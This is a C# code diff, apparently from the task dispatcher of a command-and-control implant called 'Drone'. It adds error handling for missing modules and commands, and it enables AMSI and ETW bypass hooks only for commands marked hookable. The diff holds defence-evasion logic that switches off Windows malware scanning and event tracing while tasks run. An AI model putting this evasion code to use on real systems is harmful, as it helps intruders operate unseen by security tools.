@@ -77,7 +77,18 @@ namespace Drone
         private void HandleDroneTask(DroneTask task)
         {
             var module = _modules.FirstOrDefault(m => m.Name.Equals(task.Module, StringComparison.OrdinalIgnoreCase));
-            var command = module?.Commands.FirstOrDefault(c => c.Name.Equals(task.Command, StringComparison.OrdinalIgnoreCase));
+            if (module is null)
+            {
+                SendError(task.TaskGuid, $"Module \"{task.Module}\" not found.");
+                return;
+            }
+            
+            var command = module.Commands.FirstOrDefault(c => c.Name.Equals(task.Command, StringComparison.OrdinalIgnoreCase));
+            if (command is null)
+            {
+                SendError(task.TaskGuid, $"Command \"{task.Command}\" not found in Module \"{task.Module}\".");
+                return;
+            }
 
             // cancellation token for the task
             var token = new CancellationTokenSource();
@@ -85,34 +96,40 @@ namespace Drone
             
             // send task running
             SendTaskRunning(task.TaskGuid);
+            
+            var bypassAmsi = _config.GetConfig<bool>("BypassAmsi");
+            var bypassEtw = _config.GetConfig<bool>("BypassEtw");
 
             Task.Factory.StartNew(() =>
             {
                 try
                 {
                     // handle evasion hooks
-                    var bypassAmsi = _config.GetConfig<bool>("BypassAmsi");
-                    var bypassEtw = _config.GetConfig<bool>("BypassEtw");
-
-                    if (bypassAmsi)
+                    if (command.Hookable)
                     {
-                        if (Amsi.AmsiScanBufferOriginal is null) CreateAmsiBypassHook();
-                        _hookEngine.EnableHook(Amsi.AmsiScanBufferOriginal);
-                    }
+                        if (bypassAmsi)
+                        {
+                            if (Amsi.AmsiScanBufferOriginal is null) CreateAmsiBypassHook();
+                            _hookEngine.EnableHook(Amsi.AmsiScanBufferOriginal);
+                        }
                     
-                    if (bypassEtw)
-                    {
-                        if (Etw.EtwEventWriteOriginal is null) CreateEtwBypassHook();
-                        _hookEngine.EnableHook(Etw.EtwEventWriteOriginal);
+                        if (bypassEtw)
+                        {
+                            if (Etw.EtwEventWriteOriginal is null) CreateEtwBypassHook();
+                            _hookEngine.EnableHook(Etw.EtwEventWriteOriginal);
+                        }
                     }
 
                     // run the task
-                    command?.Callback.Invoke(task, token.Token);
+                    command.Callback.Invoke(task, token.Token);
                     
                     // unload hooks
-                    if (bypassAmsi) _hookEngine.DisableHook(Amsi.AmsiScanBufferOriginal);
-                    if (bypassEtw) _hookEngine.DisableHook(Etw.EtwEventWriteOriginal);
-
+                    if (command.Hookable)
+                    {
+                        if (bypassAmsi) _hookEngine.DisableHook(Amsi.AmsiScanBufferOriginal);
+                        if (bypassEtw) _hookEngine.DisableHook(Etw.EtwEventWriteOriginal);
+                    }
+                    
                     // send task complete
                     SendTaskComplete(task.TaskGuid);
                 }
